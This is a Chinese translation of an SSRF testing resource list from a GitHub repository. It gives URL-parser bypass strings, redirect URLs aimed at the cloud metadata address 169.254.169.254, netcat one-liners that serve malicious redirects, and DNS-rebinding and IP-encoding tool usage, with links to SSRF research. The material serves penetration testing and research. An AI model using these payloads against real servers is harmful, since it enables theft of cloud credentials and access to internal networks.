项目地址：<https://github.com/cujanovic/SSRF-Testing#ssrf-server-side-request-forgery-testing-resources>  
作者：Predrag Cujanović

#### 基于快速网址绕过：

    
    
    http://google.com:80+&@127.88.23.245:22/#+@google.com:80/
    
    http://127.88.23.245:22/+&@google.com:80#+@google.com:80/
    
    http://google.com:80+&@google.com:80#+@127.88.23.245:22/
    
    http://127.88.23.245:22/?@google.com:80/
    
    http://127.88.23.245:22/#@www.google.com:80/

#### htaccess - 针对各种情况的重定向测试

状态码: 300, 301, 302, 303, 305, 307, 308

文件类型: jpg, json, csv, xml

**演示:**

jpg 301 响应（分别提供有/无有效响应正文的情况）:

    
    
    https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg
    
    https://ssrf.localdomain.pw/img-without-body-md/301-http-.i.jpg
    
    https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg
    
    https://ssrf.localdomain.pw/img-with-body-md/301-http-.i.jpg

json 301 响应（分别提供有/无有效响应正文的情况）:

    
    
    https://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json
    
    https://ssrf.localdomain.pw/json-without-body-md/301-http-.j.json
    
    https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json
    
    https://ssrf.localdomain.pw/json-with-body-md/301-http-.j.json

csv 301 响应（分别提供有/无有效响应正文的情况）:

    
    
    https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv
    
    https://ssrf.localdomain.pw/csv-without-body-md/301-http-.c.csv
    
    https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv
    
    https://ssrf.localdomain.pw/csv-with-body-md/301-http-.c.csv

xml 301 响应（分别提供有/无有效响应正文的情况）:

    
    
    https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml
    
    https://ssrf.localdomain.pw/xml-without-body-md/301-http-.x.xml
    
    https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml
    
    https://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml

#### custom-30x - Custom 30x 响应 和 PHP Location header

**演示:**

`https://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

#### custom-200 - Custom 200 响应和 PHP Content-Location header

**演示:**

`https://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

#### custom-201 - Custom 201 响应和 PHP Location header

**演示:**

`https://ssrf.localdomain.pw/custom-201/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

#### 使用 netcat 的最小 Web 服务器

`while true ; do nc -l -p 80 -c 'echo -e "HTTP/1.1 302 Found\nContent-Type:
application/json\nLocation: http://169.254.169.254/\n{\"a\":\"b\"}"'; done`

`while true ; do nc -l -p 554 -c 'echo -e "RTSP/1.0 301 Moved\nCSeq:
1\nLocation: http://169.254.169.254/"'; done`

#### ip.py - 用于 SSRF 测试的备用 IP 编码工具

python ip.py IP PORT WhiteListedDomain EXPORT(optional)

python ip.py 169.254.169.254 80 www.google.com

python ip.py 169.254.169.254 80 www.google.com export

### DNS pinning

nslookup ssrf-169.254.169.254.localdomain.pw

#### DNS pinning 竞态条件

nslookup ssrf-race-169.254.169.254.localdomain.pw

#### DNS Rebinding

pip install twised

python dns.py WhitelistedIP InternalIP Port

python dns.py 216.58.214.206 169.254.169.254 53

<http://webcache.googleusercontent.com/search?q=cache:http://www.611eternity.com/DNSRebinding%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/>

#### cloud-metadata.txt - 适用于SSRF测试的云端元数据字典

#### svg - svg 文件的 SSRF

#### ffmpeg - ffmpeg 的 SSRF

<https://hackerone.com/reports/237381>

<https://hackerone.com/reports/243470>

<https://github.com/neex/ffmpeg-avi-m3u-xbin>

<https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf>

<https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.g22371f2702_0_15>

#### iframe - SSRF with html iframe + URL bypass

**演示:**

`http://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/`

#### commonly-open-ports.txt - 常开端口列表

#### Java / Python FTP注入允许防火墙绕过

<http://webcache.googleusercontent.com/search?q=cache:http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html>

<http://webcache.googleusercontent.com/search?q=cache:https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/>

#### SSRF + Gopher + Redis

<http://webcache.googleusercontent.com/search?q=cache:http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/>

<https://webcache.googleusercontent.com/search?q=cache:http://antirez.com/news/96>

#### 通常容易出现SSRF漏洞的五大功能：

<https://webcache.googleusercontent.com/search?q=cache:https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF>

#### AppSecEU15-Server_side_browsing_considered_harmful.pdf

<https://www.youtube.com/watch?v=8t5-A4ASTIU>

#### us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

#### SSRF 提示

<http://webcache.googleusercontent.com/search?q=cache:http://blog.safebuff.com/2016/07/03/SSRF-Tips/>

#### SSRF 圣经

<https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/393/>

